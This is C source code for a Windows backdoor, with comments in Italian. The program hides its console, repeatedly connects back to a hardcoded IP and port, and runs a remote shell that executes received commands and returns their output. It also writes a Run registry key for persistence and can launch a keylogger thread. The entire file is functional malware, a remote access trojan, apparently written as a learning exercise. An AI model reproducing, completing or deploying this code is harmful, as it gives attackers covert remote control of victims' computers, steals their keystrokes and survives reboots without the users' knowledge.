// Compilation: i686-w64-mingw32-gcc -o backdoor.exe backdoor.c -lwsock32 -lwininet

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0x0, (size))

int sock;

// Crea una stringa in una chiave del registro di Windows per ottenere persistenza nel sistema target.
int bootRun(){
    char err[128] = "Failed\n";
    char suc[128] = "Created Persistence At: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];                                         // Stringa di caratteri Win32 - MAX_PATH -> Massimo numero di caratteri per un percorso in Windows (256 caratteri).
    DWORD pathLen = 0x0;                                            // Double Word

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);            // Recupera percorso file per il modulo specificato. Se NULL recupera percorso file eseguibile del processo corrente.
    if(pathLen == 0x0){
        send(sock, err, sizeof(err), 0x0);
        return -0x1;
    }

    HKEY NewVal;                                                    // Handle ad una chiave di registro aperta.

    if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){            // Apre una chiave di registro
        send(sock, err, sizeof(err), 0x0);
        return -0x1;
    }

    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if(RegSetValueEx(NewVal, TEXT("Backdoor"), 0x0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){                          // Setta valore in una chiave di registro aperta.
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0x0);
        return -0x1;
    }
    RegCloseKey(NewVal);                                                                                                                // Chiude handle alla chiave di registro specificata.
    send(sock, suc, sizeof(suc), 0x0);
    
    return 0x0;
}

char * str_cut(char str[], int slice_from, int slice_to){
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1){
                        return NULL;
                }

                if (abs(slice_from) > str_len){
                        slice_from = (-1) * str_len;
                }

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1){
                        return NULL;
                }
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else {
                return NULL;
        }

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}

// Esegue una Shell sul target permettendo al server di eseguire comandi e ritorna al server l'output dei comandi.
void Shell(){
    char buffer[1024];              // Contiene i comandi ricevuti dal server
    char container[1024];
    char total_response[18384];

    while(1){
        jump:
        bzero(&buffer, sizeof(buffer));
        bzero(&container, sizeof(container));
        bzero(&total_response, sizeof(total_response));
        recv(sock, buffer, sizeof(buffer), 0x0);

        if(strncmp("q", buffer, 1) == 0x0){
            closesocket(sock);
            WSACleanup();           // Su Windows necessario eseguirlo dopo aver chiuso la connessione di una socket.
            exit(0x0);

        // Il Comando "cd <dir>" sulla Shell non funziona, per farlo funzionare bisogna fare questo.
        } else if(strncmp("cd ", buffer, 0x3) == 0x0){              // Usa "cd " per riconoscere comando "cd <dir>" e non semplice comando "cd" che su Windows mostra current directory.
            chdir(str_cut(buffer, 0x3, 100));
        // Ottiene persistenza nel target.
        } else if (strncmp("persist", buffer, 0x7) == 0x0){
            bootRun();
        // Avvia il keylogger in background
        } else if (strncmp("keylog_start", buffer, 12) == 0x0){
            HANDLE thread = CreateThread(NULL, 0x0, logg, NULL, 0x0, NULL);
            goto jump;
        } else {
            FILE *fp;                   // File Descriptor
            fp = _popen(buffer, "r");   // Legge da buffer ed esegue il comando e ritorna un File Descriptor.
            while(fgets(container, 1024, fp) != NULL){      // Mette 1024 bytes da fp alla variabile container.
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0x0);
            fclose(fp);                 // Chiude il File Descriptor
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

    // Nasconde la console che viene aperta quando si lancia il programma.
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0x0);

    // Connessione alla backdoor.
    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "192.168.148.142";
    ServPort = 50005;

    if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0x0){
        exit(0x1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0x0);

    memset(&ServAddr, 0x0, sizeof(ServAddr));                       // Setta una parte di memoria ponendola tutta a zero.
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);                   // Indirizzo del server.
    ServAddr.sin_port = htons(ServPort);

    // Continua a provare a connettersi nel caso in cui il server non sia attivo.
    start:
    while(connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0x0){
        Sleep(10);
        goto start;
    }
    Shell();
}